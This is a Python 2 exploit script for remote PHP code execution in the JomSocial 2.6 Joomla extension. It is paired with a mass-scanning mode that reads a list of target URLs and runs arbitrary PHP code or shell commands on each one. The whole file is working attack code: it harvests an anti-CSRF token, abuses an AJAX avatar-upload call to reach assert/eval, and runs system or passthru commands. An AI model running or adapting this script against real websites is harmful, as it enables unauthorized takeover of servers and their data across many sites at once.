#!/usr/bin/python
#
# JomSocial >= 2.6 PHP code execution exploit
# and a mass vulnerability scanner.
#
# Authors:
#   - Matias Fontanini (exploit)
#   - Gaston Traberg   (exploit)
#   - xenux (mass scanner)
#
# This script combines the original JomSocial exploit with a mass
# scanner that can read a list of URLs from a file and test them.

import urllib, urllib2, re, argparse, sys, os, subprocess

class Exploit:
    token_request_data = 'option=com_community&view=frontpage'
    exploit_request_data = 'option=community&no_html=1&task=azrul_ajax&func=photos,ajaxUploadAvatar&{0}=1&arg2=["_d_","Event"]&arg3=["_d_","374"]&arg4=["_d_","{1}"]'
    json_data = '{{"call":["CStringHelper","escape", "{1}","{0}"]}}'

    def __init__(self, url, user_agent = None, use_eval = True):
        self.url = url
        self._set_user_agent(user_agent)
        self.use_eval = use_eval
        self.token_regex = re.compile('<input type=\"hidden\" name=\"([\w\d]{32})\" value=\"1\" \/>')
        self.cookie, self.token = self._retrieve_token()
        self.result_regex = re.compile('method=\\\\"POST\\\\" enctype=\\\\"multipart\\\\/form-data\\\\"><br>(.*)<div id=\\\\"avatar-upload\\\\">', re.DOTALL)
        self.command_regex = re.compile('(.*)\\[\\["as","ajax_calls","d",""\\]', re.DOTALL)

    def _set_user_agent(self, user_agent):
        self.user_agent = user_agent

    def _make_opener(self, add_cookie = True):
        opener = urllib2.build_opener()
        if add_cookie:
            opener.addheaders.append(('Cookie', self.cookie))
        opener.addheaders.append(('Referer', self.url))
        if self.user_agent:
            opener.addheaders.append(('User-Agent', self.user_agent))
        return opener

    def _retrieve_token(self):
        opener = self._make_opener(False)
        sys.stdout.write('[i] Retrieving cookies and anti-CSRF token... ')
        sys.stdout.flush()
        req = opener.open(self.url, Exploit.token_request_data)
        data = req.read()
        token = self.token_regex.findall(data)
        if len(token) < 1:
            print 'Failed'
            raise Exception("Could not retrieve anti-CSRF token")
        print 'Done'
        return (req.headers['Set-Cookie'], token[0])

    def _do_call_function(self, function, parameter):
        parameter = parameter.replace('"', '\\"')
        json_data = Exploit.json_data.format(function, parameter)
        json_data = urllib2.quote(json_data)
        data = Exploit.exploit_request_data.format(self.token, json_data)
        opener = self._make_opener()
        req = opener.open(self.url, data)
        if function == 'assert':
            return req.read()
        elif function in ['system', 'passthru']:
            result = self.command_regex.findall(req.read())
            if len(result) == 1:
                return result[0]
            else:
                return "[+] Error executing command."
        else:
            result = self.result_regex.findall(req.read())
            if len(result) == 1:
                return result[0].replace('\\/', '/').replace('\\"', '"').replace('\\n', '\n')
            else:
                return "[+] Error executing command."

    def call_function(self, function, parameter):
        if self.use_eval:
            return self.eval("echo {0}('{1}')".format(function, parameter))
        else:
            return self._do_call_function(function, parameter)

    def disabled_functions(self):
        return self.call_function("ini_get", "disable_functions")

    def test_injection(self):
        result = self.eval("echo 'HELLO' . ' - ' . 'WORLD';")
        if 'HELLO - WORLD' in result:
            print "[+] Code injection using eval works"
        else:
            print "[+] Code injection doesn't work. Try executing shell commands."

    def eval(self, code):
        if code [-1] != ';':
            code = code + ';'
        return self._do_call_function('assert', "@exit(@eval(@base64_decode('{0}')));".format(code.encode('base64').replace('\n', '')))


def run_exploit(url, php_code=None, shell_command=None, shell_function="system", no_eval=True, test=False):
    """
    Function to run the JomSocial exploit on a single URL.
    """
    try:
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url
        exploit = Exploit(url, use_eval=no_eval)
        if test:
            exploit.test_injection()
        elif php_code:
            code = php_code
            if os.path.isfile(code):
                try:
                    with open(code) as fd:
                        code = fd.read()
                except Exception:
                    return "[-] Error reading the file."
            return exploit.eval(code)
        elif shell_command:
            return exploit.call_function(shell_function, shell_command)
    except Exception as ex:
        return '[+] Error: {}'.format(str(ex))


def scan_urls_from_file(file_path):
    """
    Reads a list of URLs from a file and returns them as a list.
    """
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        return urls
    except IOError: # Changed from FileNotFoundError to IOError for Python 2 compatibility
        print("Error: File '{}' not found.".format(file_path))
        return []


def main():
    """
    Main function to parse arguments and run the exploit or mass scan.
    """
    parser = argparse.ArgumentParser(
        description="JomSocial >= 2.6 - Code execution exploit or mass scanner"
    )
    
    # Arguments for single exploit
    parser.add_argument('-u', '--url', help='The base URL')
    parser.add_argument('-p', '--php-code', help='The PHP code to execute. Use \'-\' to read from stdin, or provide a file path to read from')
    parser.add_argument('-s', '--shell-command', help='The shell command to execute')
    parser.add_argument('-c', '--shell-function', help='The PHP function to use for shell commands', default="system")
    parser.add_argument('-t', '--test', action='store_true', help='Test the PHP code injection using eval', default=False)
    parser.add_argument('-n', '--no-eval', action='store_false', help='Don\'t use eval when executing shell commands', default=True)

    # Argument for mass scanning
    parser.add_argument('-f', '--file', help='Path to a file containing a list of URLs to scan, one per line.')

    args = parser.parse_args()

    if args.file and (args.url or args.php_code == '-' or args.test):
        print("[-] Error: Cannot use --file with single-url arguments (--url, --php-code '-', --test).")
        exit(1)

    if args.file:
        urls_to_scan = scan_urls_from_file(args.file)
        if not urls_to_scan:
            exit(1)

        if not args.php_code and not args.shell_command and not args.test:
            print("[-] Error: Mass scan requires a test (--test), PHP code (--php-code), or shell command (--shell-command).")
            exit(1)

        for url in urls_to_scan:
            print("\n[*] Scanning {}...".format(url))
            if args.php_code:
                print("[+] Executing PHP code: {}".format(args.php_code))
            elif args.shell_command:
                print("[+] Executing shell command: {}".format(args.shell_command))
            elif args.test:
                print("[+] Testing code injection...")

            result = run_exploit(url, php_code=args.php_code, shell_command=args.shell_command, 
                                 shell_function=args.shell_function, no_eval=args.no_eval, test=args.test)
            print("--- Results for {} ---".format(url))
            print(result)
            print("-" * 30)

    elif not args.test and not args.php_code and not args.shell_command:
        print('[-] Need -p, -t, -s, or -f to do something...')
        exit(1)
    
    elif args.url:
        if args.php_code == '-':
            print('[i] Enter the code to be executed:')
            code = sys.stdin.read()
            print('[+] Executing PHP code...')
            print(run_exploit(args.url, php_code=code, shell_function=args.shell_function, no_eval=args.no_eval))
        else:
            if args.php_code:
                print('[+] Executing PHP code...')
            elif args.shell_command:
                print("[+] Executing shell command with function '{}'...".format(args.shell_function))
            elif args.test:
                print('[+] Running injection test...')
            
            print(run_exploit(args.url, php_code=args.php_code, shell_command=args.shell_command, 
                              shell_function=args.shell_function, no_eval=args.no_eval, test=args.test))
    else:
        print("[-] Error: --url is required for single-site operations.")
        exit(1)


if __name__ == "__main__":
    main()